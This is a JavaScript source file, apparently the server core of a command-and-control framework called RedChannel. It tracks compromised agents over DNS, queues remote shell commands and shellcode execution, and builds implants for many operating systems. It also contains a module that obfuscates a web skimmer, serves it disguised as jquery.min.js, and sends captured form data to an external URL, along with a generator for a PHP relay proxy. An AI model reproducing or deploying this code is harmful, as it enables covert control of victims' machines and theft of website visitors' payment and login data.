const DATA_PAD_CHAR = "f"
const RECORD_DATA_PREFIX = "2001"
const RECORD_HEADER_PREFIX = "ff00"
const MAX_DATA_BLOCKS_PER_IP = 6
const MAX_RECORDS_PER_COMMAND = 15 // first record is ip header, rest is data

const VALID_CLASS_ID_REGEX = /^-?[\s_a-zA-Z,]+[\s_a-zA-Z0-9-,]*$/
const VALID_URL_REGEX = /^(?:http(s)?:\/\/)+[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=.]+$/
const VALID_PROXY_DATA = /^[\:\;a-f0-9\.]+$/
const VALID_IP_REGEX = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/
const VALID_HOST_REGEX = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/
const VALID_BUILD_TARGET_OS = /^(windows|linux|darwin|android|netbsd|openbsd|freebsd|dragonfly|solaris)$/i
const VALID_BUILD_TARGET_ARCH = /^(amd64|arm|arm64|386|ppc64|ppc64le|mipsle|mips|mips64|mips64le)$/i
const VALID_IMPLANT_RESOLVER = /^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$/i

const DEFAULT_CONF_PATH = "conf/redchannel.conf"

const $fs = require('fs');
const $jsobfs = require('javascript-obfuscator');
const $request = require('request');
const $libcrypto = require("crypto");
// const $util = require('util');
const $spawn = require('child_process').spawn;
const $os = require('os');
const $path = require('path');

const RedChannelObject = require('./object.js');

class RedChannel extends RedChannelObject {
    constructor(c2_message_handler) {
        super("redchannel");

        // c2 message handler is called with mock DNS data when fetching from proxy
        // TODO: this is ugly, change it
        this.c2_message_handler = c2_message_handler;

        this.AGENT_SYSINFO = 0x01
        this.AGENT_CHECKIN = 0x02
        this.AGENT_SHELL = 0x03
        this.AGENT_MSG = 0x04
        this.AGENT_EXEC_SC = 0x05
        this.AGENT_SHUTDOWN = 0x06
        this.AGENT_KEYX = 0x07
        this.AGENT_SET_CONFIG = 0x08
        this.AGENT_IGNORE = 0xFF

        /**
         * { agent_id: {
         *      secret,         // computed secret after keyx
         *      keyx,           // keychain
         *      ident,          // agent id
         *      allow_keyx,     // toggled after keyx is received
         *      lastseen,       // timestamp, updated whenever a checkin comes in
         *      channel,        // dns or ws
         *      sendq = [],
         *      recvq = {},
         *      ignore = { rand_id: Timeout Object }
         *  }
         * }
         *
         */
        this.agents = {};

        /**
         * available commands for 'help' to display
         *
         * agent commands are available while interacting with an agent
         * c2 commands are available in the main menu
         */
        this.commands = {
            "agent": {
                "sysinfo": {
                    params: [],
                    desc: "get system info",
                },
                "keyx": {
                    params: [],
                    desc: "start a key exchange with the agent",
                },
                "agents": {
                    params: [],
                    desc: "show active agents",
                },
                "interact": {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                "shell": {
                    params: ["<command>"],
                    desc: "execute a shell command, alias: exec_cmd",
                },
                "msg": {
                    params: ["<message>"],
                    desc: "send an encrypted message to the agent, requires keyx",
                },
                "shutdown": {
                    params: ["<agent id>"],
                    desc: "shutdown the agent, confirm by entering the id, agent will not reconnect",
                },
                "debug": {
                    params: [],
                    desc: "show verbose messages",
                },
                "help": {
                    params: [],
                    desc: "show available commands",
                },
                "set proxy_url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX
                },
                "set proxy_enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication"
                },
                "set proxy_key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication"
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to checkin with the c2 (dns or proxy)",
                    validate_regex: /^[0-9]+$/
                },
                // "set domain": {
                //     params: ["<c2.domain.tld>"],
                //     desc: "set the c2 domain"
                // },
                // "set password": {
                //     params: ["<password>"],
                //     desc: "set the c2 password"
                // },
            },
            "c2": {
                "keyx": {
                    params: [],
                    desc: "start key exchange with all agents",
                },
                "agents": {
                    params: [],
                    desc: "show active agents",
                },
                "interact": {
                    params: ["<agent id>"],
                    desc: "interact with an agent",
                },
                "kill": {
                    params: ["<agent id>"],
                    desc: "deletes the agent from memory, agent may reconnect",
                },
                "debug": {
                    params: [],
                    desc: "show verbose messages",
                },
                "use skimmer": {
                    params: [],
                    desc: "use the skimmer module"
                },
                "use proxy": {
                    params: [],
                    desc: "use the proxy module"
                },
                "use static_dns": {
                    params: [],
                    desc: "use the static_dns module to add or remove static dns records"
                },
                "use implant": {
                    params: [],
                    desc: "use the implant module to build agents"
                },
                "help": {
                    params: [],
                    desc: "show available commands",
                },
            },
            "module_common": {
                "reset": {
                    params: [],
                    desc: "reset config to .conf values"
                },
                "config": {
                    params: [],
                    desc: "view config"
                },
                "help": {
                    params: [],
                    desc: "show available commands",
                },
                "back": {
                    params: [],
                    desc: "back to main menu",
                },
            },
            "skimmer": {
                "generate": {
                    params: [],
                    desc: "generate skimmer payload with the specified url and target classes and ids"
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the external skimmer c2 url (http://skimmer.url)",
                    validate_regex: VALID_URL_REGEX
                },
                "set target_classes": {
                    params: ["<class 1,class 2,class 3>"],
                    desc: "(optional) target classes with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX
                },
                "set target_ids": {
                    params: ["<id 1,id 2,id 3>"],
                    desc: "(optional) target ids with skimmer click handler, separated by comma",
                    validate_regex: VALID_CLASS_ID_REGEX
                },
            },
            "proxy": {
                "fetch": {
                    params: [],
                    desc: "force a fetch from the proxy"
                },
                "generate": {
                    params: [],
                    desc: "generate proxy payload with the specified key"
                },
                "set url": {
                    params: ["<url>"],
                    desc: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                    validate_regex: VALID_URL_REGEX
                },
                "set enabled": {
                    params: ["<1|0>"],
                    desc: "enable or disable proxy communication channel"
                },
                "set key": {
                    params: ["<key>"],
                    desc: "key to use for proxy communication"
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "how often to fetch data from proxy, in ms"
                },
            },
            "static_dns": {
                "add": {
                    params: ["<host>", "<ip>"],
                    desc: "add a static DNS A record",
                },
                "delete": {
                    params: ["<host>"],
                    desc: "delete static DNS A record"
                },
            },
            "implant": {
                "build": {
                    params: ["[os]", "[arch]"],
                    desc: "build the agent for the target os and arch",
                },
                "generate": {
                    params: ["[os]", "[arch]"],
                    desc: "alias for 'build'",
                },
                "set os": {
                    params: ["<windows|linux|darwin|...>"],
                    desc: "set the target os for the build (GOOS)",
                    validate_regex: VALID_BUILD_TARGET_OS
                },
                "set arch": {
                    params: ["<amd64|386|arm64|mips|...>"],
                    desc: "set the target arch for the build (GOARCH)",
                    validate_regex: VALID_BUILD_TARGET_ARCH
                },
                "set interval": {
                    params: ["<ms>"],
                    desc: "set implant c2 query interval"
                },
                "set resolver": {
                    params: ["<ip:port>"],
                    desc: "set implant resolver ip:port (8.8.8.8:53)",
                    validate_regex: VALID_IMPLANT_RESOLVER
                },
                "set debug": {
                    params: ["<1|0>"],
                    desc: "build debug version of the implant"
                }
            }
        };

        /**
         * holds the agent object we are currently interacting with
         */
        this.agent = {
            interact: null
        };

        this.master_password = "";

        /**
         * module actions
         * 
         * function will be executed when the command is typed
         */
        this.modules = {
            "proxy": {
                fetch_timer: {}, // stores the loop Timeout ref
                actions: {
                    "generate": this.proxy_generate,
                    "fetch": this.proxy_fetch
                }
            },
            "skimmer": {
                payload: '', // generated, payload to serve via payload_route,
                actions: {
                    "generate": this.skimmer_generate
                }
            },
            "static_dns": {
                actions: {
                    "add": this.static_dns_add,
                    "delete": this.static_dns_delete
                }
            },
            "implant": {
                actions: {
                    "generate": this.implant_build,
                    "build": this.implant_build,
                    "log": this.implant_log
                }
            }
        }
        // name of module currently interacting with
        this.using_module = "";

        this.config_file = DEFAULT_CONF_PATH;
        // merged with data from config
        this.config = {
            c2: {
                domain: "",
                dns_ip: "127.0.0.1",
                dns_port: 53,
                web_ip: "127.0.0.1",
                web_port: 4321,
                agent_interval: 5000,
            },
            skimmer: {
                payload_route: "/jquery.min.js",
                data_route: "/stats",
                url: "",
                target_classes: [],
                target_ids: []
            },
            proxy: {
                enabled: false,
                url: "",
                key: "",
                interval: 2000
            },
            implant: {
                os: "windows",
                arch: "amd64"
            },
            static_dns: {},
            debug: false
        }

        // 
        this.app_root = "";
    }

    init_agent(agent_id) {
        if (typeof this.agents[agent_id] == "undefined") {
            this.agents[agent_id] = {
                secret: null,
                keyx: null,
                ident: agent_id,
                lastseen: 0,
                ip: null,
                channel: "dns",
                allow_keyx: false,
                sendq: [],
                recvq: {},
                ignore: {}
            }
        }
    }

    kill_agent(agent_id) {
        delete this.agents[agent_id];
    }

    command_keyx(uncompressed_pubkey, agent_id) {
        if (agent_id == null) {
            // broadcast keyx
            Object.keys(this.agents).forEach((id) => {
                this.queue_data(id, this.AGENT_KEYX, uncompressed_pubkey);
            });
        } else if (typeof this.agents[agent_id] != "undefined") {
            // direct keyx
            this.queue_data(agent_id, this.AGENT_KEYX, uncompressed_pubkey);
        }
    }

    // agent must be able to decrypt the tag to execute shutdown
    command_shutdown(tag) {
        this.queue_data(this.agent.interact.ident, this.AGENT_SHUTDOWN, tag);
    }

    command_shell(shell_cmd) {
        this.queue_data(this.agent.interact.ident, this.AGENT_SHELL, shell_cmd);
    }

    command_exec_sc(shellcode) {
        this.queue_data(this.agent.interact.ident, this.AGENT_EXEC_SC, shellcode);
    }

    // agent must be able to decrypt the tag to execute shutdown
    command_sysinfo(tag) {
        this.queue_data(this.agent.interact.ident, this.AGENT_SYSINFO, tag);
    }
    /**
     * config format:
     * 
     * agent_interval=5000
     * c2_domain=domain1[,domain2?]
     */
    command_set_config(config) {
        this.queue_data(this.agent.interact.ident, this.AGENT_SET_CONFIG, config);
    }

    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    queue_data(agent_id, command, data) {
        if (data.length == 0) {
            data = $libcrypto.randomBytes(2).toString('hex');
        }
        var data_blocks = data.match(/[a-f0-9]{1,4}/g);
        var total_records = Math.floor(data_blocks.length / MAX_DATA_BLOCKS_PER_IP) + (data_blocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
        var total_commands = Math.floor(total_records / MAX_RECORDS_PER_COMMAND) + (total_records % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);

        var records = [];

        var data_id = $libcrypto.randomBytes(2).toString('hex');
        var padded_bytes = 0;
        var added_commands = 1;
        var record = "";

        for (let record_num = 0; record_num < total_records; record_num++) {
            var blocks = data_blocks.splice(0, MAX_DATA_BLOCKS_PER_IP)

            // pad the last block with trailing Fs
            var last_added_block = blocks.slice(-1)[0]
            padded_bytes = 4 - last_added_block.length
            blocks[blocks.length - 1] = this.pad_tail(last_added_block, 4)
            if (blocks.length < MAX_DATA_BLOCKS_PER_IP) {
                var blocks_needed = MAX_DATA_BLOCKS_PER_IP - blocks.length
                for (let j = 0; j < blocks_needed; j++) {
                    blocks.push(DATA_PAD_CHAR.repeat(4))
                    padded_bytes += 4
                }
            }
            if (padded_bytes > 0) {
                padded_bytes = padded_bytes / 2 // agent assumes bytes not hex strings
            }

            record = RECORD_DATA_PREFIX
                + ":"
                + this.pad_zero(record_num.toString(16), 4)
                + ":"
                + blocks.join(':')
            records.push(record)

            if (total_commands > 1
                && (records.length == MAX_RECORDS_PER_COMMAND - 1
                    || record_num == total_records - 1)) {
                record = RECORD_HEADER_PREFIX
                    + ":"
                    + data_id
                    + ":"
                    + this.pad_zero(command.toString(16), 2)
                    + this.pad_zero(padded_bytes.toString(16), 2)
                    + ":"
                    + this.pad_zero(total_records.toString(16), 4)
                    + ":"
                    + "0000:0000:0000:0001"
                records.unshift(record)
                added_commands++;

                this.agents[agent_id].sendq.push(records)
                records = []
            }
        }
        if (total_commands == 1) {
            record = RECORD_HEADER_PREFIX
                + ":"
                + data_id
                + ":"
                + this.pad_zero(command.toString(16), 2)
                + this.pad_zero(padded_bytes.toString(16), 2)
                + ":"
                + this.pad_zero(total_records.toString(16), 4)
                + ":"
                + "0000:0000:0000:0001"
            records.unshift(record)
        }

        if (command == this.AGENT_KEYX) {
            // set to false after keyx is received and there are no more keyx in sendq 
            this.agents[agent_id].allow_keyx = true;
        }

        if (records.length > 0) {
            this.agents[agent_id].sendq.push(records)
            if (this.config.proxy.enabled) {
                this.send_to_proxy(agent_id, records);

                // cleanup sendq if proxying to agent
                this.agents[agent_id].sendq = [];
            }
        }
        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
        //console.log("`- records: " + JSON.stringify(records));
    }

    send_to_proxy(agent_id, records) {
        var str_data = records.join(";") + ";";

        const options = {
            url: this.config.proxy.url,
            method: 'POST',
            form: {
                "d": str_data,
                "k": this.config.proxy.key,
                "i": agent_id,
                "p": "c"
            }
        };

        // console.log("* sending data to proxy: " + str_data);
        $request(options, (err, res, body) => {
            if (err) {
                this.log("error: failed to send data to proxy: " + str_data);
                return;
            }
            if (body.length > 0) {
                if (this.config.debug) this.log("proxy send response: " + body);
            }
        });
    }
    get_from_proxy() {
        if (!this.config.proxy.enabled) {
            return;
        }
        if (typeof this.config.proxy.url !== "string"
            || this.config.proxy.url.length === 0
            || typeof this.config.proxy.key !== "string"
            || this.config.proxy.key.length === 0) {
            return;
        }

        const options = {
            url: this.config.proxy.url,
            method: 'POST',
            form: {
                "k": this.config.proxy.key,
                "f": "a"
            }
        };

        $request(options, (err, res, body) => {
            if (err) {
                if (this.config.debug) this.log("error: proxy fetch failed: " + err);
                return;
            }

            // console.log("* proxy response: " + body);
            if (body.length === 0) {
                return;
            }

            if (body.length <= 5) {
                // console.log("* proxy response: " + body);
                if (this.config.debug) this.log("error: proxy fetch response too small: " + body);
                return;
            }

            if (!VALID_PROXY_DATA.test(body)) {
                if (this.config.debug) this.log("error: failed to validate incoming proxy data: " + body);
                return;
            }

            var data = body.replace(/;$/, '').split(';');
            data.forEach((q) => {
                var req = {
                    connection: {
                        remoteAddress: this.config.proxy.url,
                        type: 'PROXY'
                    }
                }
                var res = {
                    question: [{
                        type: 'PROXY',
                        name: q + "." + this.config.c2.domain
                    }],
                    answer: [],
                    end: () => { }
                }
                this.c2_message_handler(req, res);
            });
        });
    }

    pad_zero(data, max_len) {
        return "0".repeat(max_len - data.length) + data;
    }
    pad_tail(data, max_len) {
        return data + DATA_PAD_CHAR.repeat(max_len - data.length);
    }

    is_command_in_sendq(agent_id, command) {
        var is = false;
        var cmd = this.pad_zero(command.toString(16), 2);

        this.agents[agent_id].sendq.forEach((q) => {
            if (q[0].substring(0, 4) == RECORD_HEADER_PREFIX) {
                if (q[0].substring(12, 14) == cmd) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    make_ip_string(last_byte) {
        return RECORD_HEADER_PREFIX + ":0000:" + this.AGENT_IGNORE.toString(16) + "01:0000:0000:dead:c0de:00" + last_byte
    }

    count_data_chunks(chunks_array) {
        var num = 0;
        for (let i = 0; i < chunks_array.length; i++) {
            if (typeof chunks_array[i] != "undefined") {
                num++;
            }
        }
        return num;
    }

    /**
     * return an array of agent idents with an optional
     * prepended text to each ident
     *
     * used mostly in tab completion
     */
    get_all_agents(prepend = "") {
        var agents = [];
        Object.keys(this.agents).forEach((a) => {
            agents.push(prepend + this.agents[a].ident);
        });
        return agents;
    }

    get_agent(agent_id) {
        var agent = null;
        Object.keys(this.agents).forEach((a) => {
            if (a == agent_id) {
                agent = this.agents[a];
                return;
            }
        });
        return agent;
    }

    /**
     * skimmer generate action
     */
    skimmer_generate() {
        if (this.config.skimmer.url.length == 0) {
            return { message: "! skimmer url is required, see 'help'", error: true };
        }

        var data = null;
        var skimmer_js = "";
        try {
            data = $fs.readFileSync('payloads/skimmer.js');
            skimmer_js = data.toString();
        } catch (ex) {
            this.log("error: failed to generate payload: " + ex.toString());
            return { message: ex.toString(), error: true };
        }

        var target_classes = "['" + this.config.skimmer.target_classes.join("','") + "']";
        var target_ids = "['" + this.config.skimmer.target_ids.join("','") + "']";
        var target_url = this.config.skimmer.url;

        skimmer_js = skimmer_js.replace(/\[SKIMMER_URL\]/, target_url);
        skimmer_js = skimmer_js.replace(/\[SKIMMER_CLASSES\]/, target_classes);
        skimmer_js = skimmer_js.replace(/\[SKIMMER_IDS\]/, target_ids);
        skimmer_js = skimmer_js.replace(/\s+console\.log\(.+;/g, '');

        var obfs = null;
        try {
            obfs = $jsobfs.obfuscate(skimmer_js, {
                compact: true,
                controlFlowFlattening: true,
                transformObjectKeys: true,
                log: false,
                renameGlobals: true,
                stringArray: true,
                stringArrayEncoding: 'rc4',
                identifierNamesGenerator: 'mangled',
            });
            this.modules.skimmer.payload = obfs.getObfuscatedCode();
        } catch (ex) {
            this.log("error: failed to obfuscate js payload: " + ex.toString());
            return { message: ex.toString(), error: true };
        }

        return { message: "* skimmer payload set: \n" + this.modules.skimmer.payload, error: false };
    }
    /**
     * proxy generate action
     */
    proxy_generate() {
        if (this.config.proxy.key.length == 0) {
            return { message: "! proxy key is required, see 'help'", error: true };
        }

        var data = null;
        var proxy_php = "";
        try {
            data = $fs.readFileSync('payloads/proxy.php');
            proxy_php = data.toString();
        } catch (ex) {
            this.log("error: failed to generate payload: " + ex.toString());
            return { message: ex.toString(), error: true };
        }

        var key = this.config.proxy.key;

        proxy_php = proxy_php.replace(/\[PROXY_KEY\]/, key);
        proxy_php = proxy_php.replace(/\/\/.+/g, '');
        proxy_php = proxy_php.replace(/<\?php/g, '');
        proxy_php = proxy_php.replace(/\?>/g, '');
        proxy_php = proxy_php.replace(/\n/g, '');
        proxy_php = proxy_php.replace(/\s{2,}/g, '');

        this.modules.proxy.payload = "<?php " + proxy_php + " ?>";
        return { message: "* proxy payload set: \n" + this.modules.proxy.payload, error: false };
    }
    proxy_fetch() {
        this.get_from_proxy();
        return { message: "* fetching data from proxy...", error: false }
    }

    static_dns_add(params) {
        if (params.length < 2) {
            return { message: "! please enter a host and ip, see 'help'", error: true }
        }

        var host = params[0];
        var ip = params[1];

        if (!VALID_HOST_REGEX.test(host)) {
            return { message: "! invalid host value, see 'help'", error: true }
        }
        if (!VALID_IP_REGEX.test(ip)) {
            return { message: "! invalid ip value, see 'help'", error: true }
        }

        this.config.static_dns[host] = ip;
        return { message: "* added static dns record", error: false }
    }
    static_dns_delete(params) {
        if (params.length == 0) {
            return { message: "! please enter a host, see 'help'", error: true }
        }

        var host = params[0];
        if (!VALID_HOST_REGEX.test(host)) {
            return { message: "! invalid host value, see 'help'", error: true }
        }

        delete this.config.static_dns[host];
        return { message: "* deleted static dns record", error: false }
    }

    implant_build_gen_config() {
        var data = null;
        var config_data = "";
        var agent_config_path = this.app_root + "/agent/config/config.go";
        try {
            data = $fs.readFileSync(agent_config_path + ".sample");
            config_data = data.toString();
        } catch (ex) {
            this.log("error: failed to read agent config file template '" + agent_config_path + ".sample': " + ex.toString());
            throw ex;
        }

        config_data = config_data.replace(/^\s*c\.C2Domain\s*=\s*\".*\".*$/im, `c.C2Domain = "${this.config.c2.domain}"`);
        config_data = config_data.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.config.c2.plaintext_password}"`);
        config_data = config_data.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.implant.resolver}"`);
        config_data = config_data.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.implant.interval}`);
        config_data = config_data.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy.enabled}`);
        config_data = config_data.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy.url}"`);
        config_data = config_data.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy.key}"`);

        try {
            $fs.writeFileSync(agent_config_path, config_data, { flags: 'w' });
        } catch (ex) {
            this.log("error: failed to write agent config file '" + agent_config_path + "': " + ex.toString());
            throw ex;
        }
        return { message: "* agent config file written to: " + agent_config_path, error: false };
    }
    implant_build(params) {
        var os = this.config.implant.os;
        var arch = this.config.implant.arch;
        var debug = this.config.implant.debug;

        if (typeof params[0] !== "undefined") {
            os = params[0];
        }
        if (typeof params[0] !== "undefined") {
            arch = params[1];
        }
        if (!VALID_BUILD_TARGET_OS.test(os)) {
            return { message: "! invalid os value, must be supported by Go (GOOS)", error: true }
        }
        if (!VALID_BUILD_TARGET_ARCH.test(arch)) {
            return { message: "! invalid arch value, must be supported by Go (GOARCH)", error: true }
        }

        try {
            this.implant_build_gen_config();
        } catch (ex) {
            return { message: ex.toString(), error: true };
        }

        var root_folder = this.app_root;

        var ext = (os === "windows" ? ".exe" : "");
        var build_path = root_folder + "/agent";
        var output_file = build_path + "/build/agent" + ext;
        var binary = "python";
        var command_args = [
            `${build_path}/tools/build.py`,
            `${build_path}`,
            `${output_file}`,
            `${os}`,
            `${arch}`,
            `${debug && "debug"}`
        ]

        var env_variables = {
            "GOOS": os,
            "GOARCH": arch,
            "GOCACHE": $path.join($os.tmpdir(), 'rc-build-cache'), // 'go cache clean' after build?
            "GOPATH": $path.join($os.tmpdir(), 'rc-build-path'),
            "PATH": process.env.PATH
        }

        try {
            // TODO: do this with docker instead? https://hub.docker.com/_/golang
            var child = $spawn(binary, command_args, { env: env_variables, cwd: build_path /*, windowsVerbatimArguments: true*/ });
            child.on("close", (code) => {
                // send this message to the UI somehow
                this.log("agent build for os: " + os + ", arch: " + arch + ", return code: " + code);
            });
        } catch (ex) {
            return { message: "! failed to launch build command: '" + ex.toString() + "', build command: '" + binary + " " + command_args.join(' ') + "'", error: true };
        }

        try {
            var log_stream = $fs.createWriteStream(root_folder + "/agent/build/build.log", { flags: 'w' });
            child.stdout.pipe(log_stream);
            child.stderr.pipe(log_stream);
        } catch (ex) {
            return { message: "! failed to write log file: " + ex.toString(), error: true };
        }

        this.config.implant.output_file = output_file;
        var binary_url = this.config.c2.web_url + this.config.c2.binary_route;

        return { message: `* building ${debug ? "(debug)" : ""} agent for os: ${os}, arch: ${arch}, binary will be available here: ${output_file} and ${binary_url}`, error: false }
    }
    implant_log() {
        var log_path = this.app_root + "/agent/build/build.log";
        var log_data = "";
        try {
            log_data = $fs.readFileSync(log_path).toString();
        } catch (ex) {
            this.log("error: failed to read build log file: " + ex.toString());
            return { message: ex.toString(), error: true };
        }

        return { message: log_data, error: false }
    }
}

module.exports = RedChannel;
